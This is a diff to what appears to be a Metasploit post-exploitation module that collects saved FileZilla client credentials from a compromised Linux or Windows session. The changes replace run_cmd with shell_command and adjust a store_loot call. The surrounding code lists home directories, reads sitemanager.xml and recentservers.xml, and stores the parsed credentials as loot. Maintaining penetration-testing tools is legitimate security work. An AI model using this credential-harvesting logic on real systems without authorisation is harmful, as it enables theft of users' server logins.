@@ -80,10 +80,10 @@ class Metasploit3 < Msf::Post
 		end
 
 		if got_root?
-			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
+			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
 			userdirs << "/root\n"
 		else
-			userdirs = session.run_cmd("ls #{home}#{whoami}/.filezilla")
+			userdirs = session.shell_command("ls #{home}#{whoami}/.filezilla")
 			if userdirs =~ /No such file/i
 				return 
 			else
@@ -100,7 +100,7 @@ class Metasploit3 < Msf::Post
 			dir = "#{home}#{dir}" if dir !~ /root/
 			print_status("Checking for FileZilla Client profile in: #{dir}")
 
-			stat = session.run_cmd("ls #{dir}/.filezilla/sitemanager.xml")
+			stat = session.shell_command("ls #{dir}/.filezilla/sitemanager.xml")
 			next if stat =~ /No such file/i
 			paths << "#{dir}/.filezilla"
 		end
@@ -164,8 +164,8 @@ class Metasploit3 < Msf::Post
 			print_status("Reading sitemanager.xml and recentservers.xml files from #{path}")
 			if session.type == "shell"
 				type = :shell
-				sites = session.run_cmd("cat #{path}/sitemanager.xml")
-				recents = session.run_cmd("cat #{path}/recentservers.xml")
+				sites = session.shell_command("cat #{path}/sitemanager.xml")
+				recents = session.shell_command("cat #{path}/recentservers.xml")
 				puts "recents: #{recents}"
 				creds = [parse_accounts(sites)]
 				creds << parse_accounts(recents) unless recents =~ /No such file/i
@@ -193,7 +193,7 @@ class Metasploit3 < Msf::Post
 			end
 		end
 
-		store_loot("filezilla.client.creds", "text/plain", session.tunnel_peer, credentials.to_s, "filezilla_client_credentials.txt", "FileZilla Client Credentials")
+		store_loot("filezilla.client.creds", "text/plain", session, credentials.to_s, "filezilla_client_credentials.txt", "FileZilla Client Credentials")
 	end
 
 	def parse_accounts(data)
@@ -268,7 +268,7 @@ class Metasploit3 < Msf::Post
 		if @platform == :windows
 			session.fs.file.expand_path("%USERNAME%")
 		else
-			session.run_cmd("whoami").chomp
+			session.shell_command("whoami").chomp
 		end
 	end
 end
